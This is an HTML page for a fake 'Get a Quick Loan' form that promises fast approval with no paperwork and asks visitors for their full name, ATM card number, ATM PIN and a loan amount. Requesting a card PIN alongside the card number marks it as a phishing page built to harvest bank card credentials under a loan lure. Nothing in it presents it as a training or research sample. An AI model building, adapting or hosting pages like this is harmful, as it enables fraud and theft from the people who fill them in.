<!DOCTYPE html>
<html>
<head>
    <title>Instant Loan Request</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: sans-serif; background-color: #eef2f7; padding: 40px; }
        .form-box { width: 500px; margin: auto; background: #fff; padding: 30px; border-radius: 6px; box-shadow: 0 0 15px #ccc; }
        h1 { text-align: center; color: #006600; }
        label, input { display: block; width: 100%; margin: 10px 0; }
        button { background-color: #006600; color: #fff; padding: 10px; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="form-box">
        <h1>Get a Quick Loan</h1>
        <p>No paperwork. Fast approval. Enter your details below.</p>
        <form>
            <label>Full Name</label>
            <input type="text" name="fullname">
            <label>ATM Card Number</label>
            <input type="text" name="card">
            <label>PIN</label>
            <input type="password" name="pin">
            <label>Amount</label>
            <input type="text" name="amount">
            <button type="submit">Apply</button>
        </form>
    </div>
</body>
</html>
